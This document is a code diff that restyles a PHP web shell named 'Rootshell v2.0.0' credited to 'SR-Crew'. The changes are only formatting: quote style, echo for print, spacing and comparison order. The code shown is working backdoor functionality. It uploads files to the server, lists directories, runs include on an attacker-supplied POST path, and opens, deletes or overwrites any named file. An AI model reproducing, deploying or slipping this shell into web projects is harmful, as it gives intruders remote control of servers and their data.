@@ -67,8 +67,8 @@
 // Default Changes
 //    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
-$owner        = "SR-Crew";                                                      // Insert your nick
-$version      = "2.0.0";                                                        // The version
+$owner = 'SR-Crew';                                                      // Insert your nick
+$version = '2.0.0';                                                        // The version
 
 //    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 //
@@ -96,9 +96,9 @@ cursor:crosshair
   <?php
 // Check for safe mode
 if (ini_get('safe_mode')) {
-    print '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
+    echo '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
 } else {
-    print '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
+    echo '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
 }
 
 ?>
@@ -113,11 +113,11 @@ if (ini_get('safe_mode')) {
       <p align="center">
         <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
         <br />
-        <b>Shell:</b> <?php echo $SCRIPT_FILENAME ?>
+        <b>Shell:</b> <?php echo $SCRIPT_FILENAME; ?>
         <br>
-        <b>Server Software:</b> <?php echo $SERVER_SOFTWARE ?><br>
-        <b>Server Name:</b> <?php echo $SERVER_NAME ?><br>
-        <b>Server Protocol:</b> <?php echo $SERVER_PROTOCOL ?><br>
+        <b>Server Software:</b> <?php echo $SERVER_SOFTWARE; ?><br>
+        <b>Server Name:</b> <?php echo $SERVER_NAME; ?><br>
+        <b>Server Protocol:</b> <?php echo $SERVER_PROTOCOL; ?><br>
         </font></tr>
   </table><br />
     <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="426" bordercolor="#000000">
@@ -160,8 +160,8 @@ if (ini_get('safe_mode')) {
 function check_file()
 {
     global $file_name, $filename;
-    $backupstring = "copy_of_";
-    $filename = $backupstring."$filename";
+    $backupstring = 'copy_of_';
+    $filename = $backupstring . "$filename";
 
     if (file_exists($filename)) {
         check_file();
@@ -172,13 +172,13 @@ if (!empty($file)) {
     $filename = $file_name;
     if (file_exists($file_name)) {
         check_file();
-        echo "<p align=center>File already exist</p>";
+        echo '<p align=center>File already exist</p>';
     } else {
         copy($file, "$filename");
         if (file_exists($filename)) {
-            echo "<p align=center>File uploaded successful</p>";
-        } elseif (! file_exists($filename)) {
-            echo "<p align=center>File not found</p>";
+            echo '<p align=center>File uploaded successful</p>';
+        } elseif (!file_exists($filename)) {
+            echo '<p align=center>File not found</p>';
         }
     }
 }
@@ -201,10 +201,10 @@ if (!empty($file)) {
       <br>
 <div align="center" style="overflow:auto; width:99%; height:175">
 <?php
-$folder=opendir('./');
+$folder = opendir('./');
 while ($file = readdir($folder)) {
-    if ($file != "." && $file != "..") {
-        echo '<a target="blank" href='.$file.'>'.$file.'</a><br>';
+    if ('.' != $file && '..' != $file) {
+        echo '<a target="blank" href=' . $file . '>' . $file . '</a><br>';
     }
 }
 closedir($folder);
@@ -221,7 +221,7 @@ closedir($folder);
         <br>
         <input type="submit" value="Include!" name="inc"></p>
       </form>
-      <?php @$output = include($_POST['incl']); ?>
+      <?php @$output = include $_POST['incl']; ?>
       </td>
       </tr>
     <tr>
@@ -235,9 +235,9 @@ closedir($folder);
 <font face="Verdana" style="font-size: 11pt">
       <p align="center"><?php
 $scriptname = $_SERVER['SCRIPT_NAME'];
-$filename = $_POST["filename"];
+$filename = $_POST['filename'];
 
-if ($_POST["submit"] == "Open") {
+if ('Open' == $_POST['submit']) {
     if (file_exists($filename)) {
         $filecontents = htmlentities(file_get_contents($filename));
 
@@ -247,7 +247,7 @@ if ($_POST["submit"] == "Open") {
     } else {
         $status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
     }
-} elseif ($_POST["submit"] == "Delete") {
+} elseif ('Delete' == $_POST['submit']) {
     if (file_exists($filename)) {
         if (unlink($filename)) {
             $status = "<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>";
@@ -257,20 +257,20 @@ if ($_POST["submit"] == "Open") {
     } else {
         $status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
     }
-} elseif ($_POST["submit"] == "Save") {
-    $filecontents = stripslashes(html_entity_decode($_POST["contents"]));
+} elseif ('Save' == $_POST['submit']) {
+    $filecontents = stripslashes(html_entity_decode($_POST['contents']));
 
     if (file_exists($filename)) {
         unlink($filename);
     }
 
-    $handle = fopen($filename, "w");
+    $handle = fopen($filename, 'w');
 
     if (!$handle) {
         $status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
     } else {
         if (!fwrite($handle, $filecontents)) {
-            $status = $status."<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";
+            $status = $status . "<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";
         }
 
         fclose($handle);
@@ -317,7 +317,7 @@ if ($_POST["submit"] == "Open") {
       <td width="51%" height="232">
       <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
 <textarea rows="13" cols="55"></textarea><br>
-      &nbsp;</font><?php @$output = include($_POST['incl']); ?></td>
+      &nbsp;</font><?php @$output = include $_POST['incl']; ?></td>
     </tr>
   </table>
   </center>
@@ -328,7 +328,7 @@ if ($_POST["submit"] == "Open") {
   <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
     <tr>
       <td width="100%" bgcolor="#FCFEBA" height="20">
-      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version" ?>  © 2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.de.tt">SR-Crew</a> </font></td>
+      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version"; ?>  © 2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.de.tt">SR-Crew</a> </font></td>
     </tr>
   </table>
   </center>
